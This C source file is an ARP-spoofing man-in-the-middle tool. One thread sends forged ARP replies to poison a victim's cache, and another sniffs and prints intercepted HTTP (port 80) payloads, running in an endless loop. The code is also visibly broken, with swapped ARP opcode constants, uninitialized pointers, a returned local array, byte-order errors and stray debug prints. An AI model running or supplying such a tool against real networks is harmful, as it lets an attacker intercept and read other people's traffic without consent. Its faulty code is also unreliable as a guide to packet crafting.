#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
/*
#define REPLY 0x0001
#define REQUEST 0x0002
#define IPSIZE 0x04
#define ARPLEN 28
*/

#define MACLEN 6
#define ARP 0x0806
#define ETHERNET 0x0001
#define IPv4 0x0800
#define ETHERSIZE 0x06
#define IPSIZE 0x04
#define REQUEST 0x0002
#define REPLY 0x0001
#define ETHERNETLEN 14
#define ARPLEN 28


struct ethernet_header{
    uint8_t dest_mac[ETHER_ADDR_LEN];
    uint8_t src_mac[ETHER_ADDR_LEN];
    uint16_t ether_type;
};

struct arp_header{
    uint16_t hw_type;
    uint16_t protocol_type;
    uint8_t hw_size;
    uint8_t protocol_size;
    uint16_t opcode;
    uint8_t send_mac[ETHER_ADDR_LEN];
    uint32_t send_ip;
    uint8_t target_mac[ETHER_ADDR_LEN];
    uint32_t target_ip;
};

struct ip_header{
    uint8_t vhl;
    uint8_t tos;
    uint16_t len;
    uint16_t id;
    uint16_t foffset;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t checksum;
    uint32_t src_ip;
    uint32_t dest_ip;
};

#define IP_HL(ip) ((ip->vhl)&0x0f)

struct tcp_header{
    uint16_t src_port;
    uint16_t dest_port;
    uint32_t seqnum;
    uint32_t acknum;
    uint16_t offset_flag;
    uint16_t windowsize;
    uint16_t checksum;
    uint16_t urgentp;
};

#define TCP_OFF(tcp) (((tcp->offset_flag)&0xf0) >> 4)

uint8_t mymac[MACLEN];
uint32_t myip;

void getMyinfo(char* dev){
    struct ifreq s;
    struct sockaddr_in *sin;
    char ip[40];
    int i;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);

    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (i = 0; i < MACLEN; ++i){
            mymac[i] = s.ifr_addr.sa_data[i];
        }

        sin = (struct sockaddr_in*)&s.ifr_addr;
        inet_ntop(AF_INET, s.ifr_addr.sa_data+2, ip, sizeof(struct sockaddr));

        inet_pton(AF_INET, ip, &(myip));
        close(fd);

        return;
    }


    close(fd);

    fprintf(stderr, "Socket Error\n");
    exit(2);
}

uint8_t* GetTargetMac(char *dev, uint32_t *target_ip){

    int i;
    struct ethernet_header original_ether;
    struct ethernet_header *original_reply;
    struct arp_header original_arp;
    pcap_t *handle;
    u_char *packet;
    const u_char *reply;
    int packet_length = 0;
    struct pcap_pkthdr *header;
    int totallen;
    int res;
    uint16_t reply_ether_type;
    uint8_t target_mac[MACLEN];
    char errbuf[PCAP_ERRBUF_SIZE];


    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL){
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        exit(1);
    }

    for (i = 0; i<MACLEN; i++){
        original_ether.dest_mac[i] = 0xF;
    }
    for (i = 0; i<MACLEN; i++){
        original_ether.src_mac[i] = mymac[i];
    }
    original_ether.ether_type = ARP;

    original_arp.hw_type = ETHERNET;
    original_arp.protocol_type = IPv4;
    original_arp.hw_size = ETHERSIZE;
    original_arp.protocol_size = IPSIZE;
    original_arp.opcode = REQUEST;
    for(i = 0; i<MACLEN; i++){
        original_arp.send_mac[i] = mymac[i];
    }
    original_arp.send_ip = myip;
    for(i = 0; i<MACLEN; i++){
        original_arp.target_mac[i] = 0x0;
    }

    original_arp.target_ip = *target_ip;

    totallen = ETHERNETLEN+ARPLEN;
    packet = (uint8_t*)malloc(totallen*sizeof(char));
    memset(packet, '0', totallen);

    memcpy(packet, &original_ether, sizeof(original_ether));
    packet_length += sizeof(original_ether);

    memcpy(packet+packet_length, &original_arp, sizeof(original_arp));
    packet_length += sizeof(original_arp);

    if (packet_length < totallen){
        for(i = packet_length; i < totallen; i++)
            packet[i] = '0';
    }
    printf("PacketLen : %d\n", packet_length);
    if (pcap_sendpacket(handle, packet, packet_length) != 0){
        fprintf(stderr, "Error sending the packet\n");
        exit(2);
    }
    printf("Send??\n");
    while (1){
        printf("0k0k?\n");
        res = pcap_next_ex(handle, &header, &reply);
        printf("0k0k?\n");
        printf("%d\n", res);
        if (res == 0)
            continue;
        printf("##\n");
        original_reply = (struct ethernet_header*)reply;
        reply_ether_type = ntohs(original_reply->ether_type);

        if(reply_ether_type == ARP){
            for (i = 0; i<MACLEN; i++){
                target_mac[i] = original_reply->src_mac[i];
                printf("%c\n", original_reply->src_mac[i]);
            }
            break;
        }
    }

    printf("end\n");

    pcap_close(handle);

    return target_mac;

}


void* infectARP(void *arg){

    int i;
    char *dev;
    uint8_t *packet;
    uint8_t *res;
    uint32_t packet_length = 0;
    pcap_t *handle;
    struct pcap_pkthdr header;
    char errbuf[PCAP_ERRBUF_SIZE];
    char **argv;

    struct ethernet_header original_ether;
    struct ethernet_header *original_reply;
    struct arp_header original_arp;
    struct ethernet_header attack_ether;
    struct arp_header attack_arp;

    uint16_t reply_ether_type;
    uint8_t *sender_mac;
    uint32_t *target_ip;
    uint32_t *sender_ip;
    int *buf1, *buf2;
    /*
    if(argc != 1){
        fprintf(stderr, "Argument Error\n");
        return 2;
    }
*/
    argv = (char **)arg;

    dev = argv[1];
    buf1 = argv[2];
    inet_pton(AF_INET, &buf1, sender_ip);
    buf2 = argv[3];
    inet_pton(AF_INET, &buf2, target_ip);
    printf("%d\n%d\n", sender_ip, target_ip);

    getMyinfo(dev);

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL){
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        exit(1);
    }

    sender_mac = (uint8_t *)malloc(MACLEN*sizeof(uint8_t));
    sender_mac = GetTargetMac(dev, &sender_ip);
    printf("&&\n");
    printf("%s\n", sender_mac);
    printf("&&\n");

    for(i = 0; i<MACLEN; i++){
        attack_ether.dest_mac[i] = mymac[i];
    }
    for(i = 0; i<MACLEN; i++){
        attack_ether.src_mac[i] = sender_mac[i];
    }
    attack_ether.ether_type = ARP;
    printf("&&\n");
    attack_arp.hw_type = ETHERNET;
    attack_arp.protocol_type = IPv4;
    attack_arp.hw_size = ETHERSIZE;
    attack_arp.protocol_size = IPSIZE;
    attack_arp.opcode = REPLY;
    for(i = 0; i<MACLEN; i++){
        attack_arp.send_mac[i] = mymac[i];
    }
    attack_arp.send_ip = target_ip;
    for(i=0; i<MACLEN; i++){
        attack_arp.target_mac[i] = sender_mac[i];
    }
    attack_arp.target_ip = sender_ip;
    printf("&&\n");
    packet_length = 0;
    memset(packet, 0, sizeof(packet));
    memcpy(packet, &attack_ether, sizeof(attack_ether));
    packet_length += sizeof(attack_ether);
    printf("&&\n");
    memcpy(packet+packet_length, &attack_arp, sizeof(attack_arp));
    packet_length += sizeof(attack_arp);
    printf("&&\n");
    if (packet_length < ETHERNETLEN+ARPLEN){
        for(i = packet_length; i<ETHERNETLEN+ARPLEN; i++)
            packet[i] = 0;
    }

    printf("&&\n");
    if(pcap_sendpacket(handle, packet, packet_length) != 0){
        fprintf(stderr, "Error sending the attack packet\n");
        return 2;
    }

    pcap_close(handle);

    printf("%%\n");
    return 0;
}


void* Spoofpacket(void* arg){

    int i;
    char *dev;
    uint8_t *buf;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    struct bpf_program fp;
    char filter_exp[] = "port 80";
    //bpf_u_int32 mask;
    bpf_u_int32 net;
    struct pcap_pkthdr header;
    const uint8_t *packet;
    const uint8_t *res;

    struct ethernet_header *ethernet;
    struct ip_header *ip;
    struct tcp_header *tcp;
    const char *payload;
    uint32_t *target_ip;
    uint32_t *sender_ip;
    uint8_t *target_mac;

    uint32_t size_payload;
    uint32_t size_ip;
    uint32_t size_tcp;
    char **argv;

    argv = (char **)arg;

    dev = argv[1];
    buf = argv[2];
    inet_pton(AF_INET, &buf, sender_ip);
    buf = argv[3];
    inet_pton(AF_INET, &buf, target_ip);

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev ,errbuf);
        return 2;
    }

    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return 2;
    }

    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        return 2;
    }

    target_mac = (uint8_t *)malloc(MACLEN*sizeof(uint8_t));
    target_mac = GetTargetMac(dev, target_ip);

    while((res = pcap_next_ex(handle, &header, &packet) >= 0)){

        /*
        cnt++;
        if(cnt > 30)
            break;
        */
        if (res == 0)
            continue;

        ethernet = (struct ethernet_header*)(packet);

        ip = (struct ip_header*)(packet + ETHERNETLEN);
        size_ip = IP_HL(ip)*4;

        if (size_ip < 16){
            printf("Invalid IP header length : %u bytes\n", size_ip);
            continue;
        }

        tcp = (struct tcp_header*)(packet + ETHERNETLEN + size_ip);
        size_tcp = TCP_OFF(tcp)*4;
        if (size_tcp < 20){
            printf("Invalid TCP header length : %u bytes\n", size_tcp);
            continue;
        }

        //compare
        inet_ntop(AF_INET, &(ip->dest_ip), buf, sizeof(buf));

        if(strcmp(buf, myip) != 0)
            continue;

        for(i = 0; i<MACLEN; i++){
            ethernet->src_mac[i] = mymac[i];
        }
        for(i=0; i<MACLEN; i++){
            //ethernet->dest_mac[i] = targetmac[i];
        }




        printf("-------------------------------------------------\n");
        printf("Sorce Mac Address:                %s\n", ether_ntoa(&ethernet->src_mac));
        printf("Destination Mac Address:          %s\n", ether_ntoa(&ethernet->dest_mac));
        printf("-------------------------------------------------\n");
        inet_ntop(AF_INET, &(ip->src_ip), buf, sizeof(buf));
        printf("Sorce IP Address:                 %s\n", buf);
        inet_ntop(AF_INET, &(ip->dest_ip), buf, sizeof(buf));
        printf("Destination IP Address:           %s\n", buf);
        printf("-------------------------------------------------\n");
        printf("Sorce Port:                       %d\n", ntohs(tcp->src_port));
        printf("Destination Port:                 %d\n", ntohs(tcp->dest_port));
        printf("-------------------------------------------------\n");

        size_payload = ntohs(ip->len) - (size_ip + size_tcp);

        if (size_payload > 0){
            payload = (char*)(packet + ETHERNETLEN + size_ip + size_tcp);
            printf("Data:\n%s\n", payload);
        }
        else
            printf("No Data\n");
        printf("-------------------------------------------------\n");

    }

    if(res == -1){
        fprintf(stderr, "Error reading the packets: %s\n", pcap_geterr(handle));
        return -1;
    }

    pcap_close(handle);

    return 0;

}


int main(int argc, char* argv[]){

    pthread_t p_thread[2];

    int tid;
    int result;

    printf("%d\n", argc);

    while(1){

        tid = pthread_create(&p_thread[0], NULL, infectARP, (void*)argv);
        if(tid < 0){
            perror("thread (Infect ARP) create error : ");
            exit(0);
        }


        tid = pthread_create(&p_thread[1], NULL, Spoofpacket, (void*)argv);
        if(tid < 0){
            perror("thread (Spoofed packet) create error : ");
            exit(0);
        }

        pthread_join(p_thread[0], NULL);
        pthread_join(p_thread[1], NULL);
    }

    return 0;
}
